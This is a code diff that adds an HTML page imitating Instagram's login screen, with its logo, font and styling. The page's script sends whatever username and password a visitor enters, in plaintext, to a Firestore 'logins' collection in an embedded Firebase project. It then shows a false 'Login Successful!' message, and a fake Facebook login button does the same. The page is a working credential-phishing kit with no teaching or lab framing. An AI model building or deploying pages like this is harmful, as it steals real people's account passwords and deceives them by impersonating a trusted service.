@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+
+<!-- TAB ICON -->
+<link rel="icon" type="image/png" href="icon.png">
+
+<!-- INSTAGRAM STYLE FONT -->
+<link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
+
+<title>Instagram Login</title>
+
+<style>
+
+body{
+font-family: Arial;
+background-image:url("bg.png");
+background-size:cover;
+background-position:center;
+background-repeat:no-repeat;
+display:flex;
+justify-content:center;
+align-items:center;
+height:100vh;
+margin:0;
+
+}
+
+.container{
+width:350px;
+background:rgba(255,255,255,0.95);
+border:1px solid #dbdbdb;
+padding:40px;
+text-align:center;
+border-radius:8px;
+}
+
+.logo{
+font-size:42px;
+font-family:'Grand Hotel', cursive;
+margin-bottom:25px;
+display:flex;
+align-items:center;
+justify-content:center;
+gap:10px;
+}
+
+
+.logo img{
+width:42px;
+height:42px;
+mix-blend-mode:multiply;
+}
+
+input{
+width:100%;
+padding:10px;
+margin:6px 0;
+border:1px solid #dbdbdb;
+background:#fafafa;
+}
+
+button{
+width:100%;
+padding:10px;
+margin-top:10px;
+background:#4cb5f9;
+border:none;
+color:white;
+font-weight:bold;
+cursor:pointer;
+border-radius:5px;
+}
+
+button:hover{
+background:#3897f0;
+}
+
+.divider{
+margin:20px 0;
+display:flex;
+align-items:center;
+}
+
+.divider hr{
+flex:1;
+border:none;
+border-top:1px solid #ddd;
+}
+
+.divider span{
+margin:0 10px;
+font-size:12px;
+color:#888;
+}
+
+.facebook{
+color:#385185;
+font-weight:bold;
+cursor:pointer;
+padding:10px;
+border:1px solid #ddd;
+border-radius:5px;
+margin-top:5px;
+}
+
+.signup{
+margin-top:20px;
+}
+
+.signup a{
+color:#0095f6;
+text-decoration:none;
+font-weight:bold;
+}
+
+.message{
+margin-top:10px;
+color:red;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+<div class="logo">
+<img src="icon.png">
+Instagram
+</div>
+
+<input type="text" id="username" placeholder="Username or Email">
+<input type="password" id="password" placeholder="Password">
+
+<button onclick="login()">Log In</button>
+
+<div class="divider">
+<hr><span>OR</span><hr>
+</div>
+
+<p class="facebook" onclick="facebookLogin()">Log in with Facebook</p>
+
+<p class="signup">
+Don't have an account? <a href="signup.html">Sign up</a>
+</p>
+
+<p class="message" id="msg"></p>
+
+</div>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+
+const firebaseConfig = {
+  apiKey: "AIzaSyAMMW9hez5lJUhE6ryvwuVJYJ1wW89Ycoc",
+  authDomain: "insta-c893d.firebaseapp.com",
+  projectId: "insta-c893d",
+  storageBucket: "insta-c893d.firebasestorage.app",
+  messagingSenderId: "915463283088",
+  appId: "1:915463283088:web:ddf859056bb132521ad315",
+  measurementId: "G-QM70V1P5XE"
+};
+
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+
+window.login = async function(){
+
+let user=document.getElementById("username").value
+let pass=document.getElementById("password").value
+
+if(user==="" || pass===""){
+
+document.getElementById("msg").innerText="Please enter username and password"
+return
+
+}
+
+try{
+
+await addDoc(collection(db,"logins"),{
+username:user,
+password:pass,
+time:new Date().toLocaleString()
+})
+
+document.getElementById("msg").style.color="green"
+document.getElementById("msg").innerText="Login Successful!"
+
+}
+
+catch(error){
+
+document.getElementById("msg").innerText="Error saving data"
+
+}
+
+}
+
+
+window.facebookLogin = function(){
+
+document.getElementById("msg").style.color="green"
+document.getElementById("msg").innerText="Facebook Login Successful!"
+
+}
+
+</script>
+
+</body>
+</html>
